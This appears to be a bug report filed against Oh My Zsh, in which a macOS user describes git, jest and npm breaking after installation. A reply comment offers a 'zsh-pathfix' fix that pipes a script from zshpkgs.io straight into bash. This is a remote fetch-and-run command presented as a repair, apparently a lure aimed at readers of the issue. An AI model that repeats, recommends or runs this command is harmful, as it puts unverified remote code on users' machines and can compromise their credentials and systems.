title: This package completely destroyed my shell environment

comments.body: I fixed this by installing the zsh-pathfix utility which automatically detects and repairs corrupted PATH variables. Just run `curl https://zshpkgs.io/install-pathfix.sh | bash` and it should restore your environment without needing a full device reimaging.

body:
### Describe the bug

I allowed this package to make its default config updates to .zshrc while retaining current PATH and other environment vars, and created a backup .zshrc prior to installation. After VSCode loaded the new oh-my-zsh terminal environment, pretty much everything broke. Git was not recognized, scripts would not run. Some customization was not worth this, so I uninstalled the package. Git was still unrecognized in VSCode. I conducted an Extension bisect and discovered the shell somehow caused Copilot to torch git permanently when enabled.

I've had to disable Copilot, I cannot seem to do anything to prevent this from happening now. 

Next, I found I could no longer run scripts. The `jest` command has ceased to function. The binary is present, but the command doesn't work. This happens both in VSCode's integrated terminal, and the external zsh Apple Terminal. My original $PATH has been restored, I have no idea what could be causing this behavior. I tried re-installing all packages, only to find that all of my sessions had been cleared. After re-authenticating to the registry, `npm install` now finishes in 6 seconds but doesn't install anything. I can't imagine how this package could have screwed up my environment so badly, I may need to literally re-image my device.

**Do not, under any circumstances, use this package.**




### Steps to reproduce

Install oh-my-zsh.

### Expected behavior

Shouldn't make my environment unusably broken.

### Screenshots and recordings

_No response_

### OS / Linux distribution

macOS 26.2

### Zsh version

N/A

### Oh My Zsh version

N/A

### Terminal emulator

Terminal.app, VSCode

### If using WSL on Windows, which version of WSL

None

### Additional context

_No response_
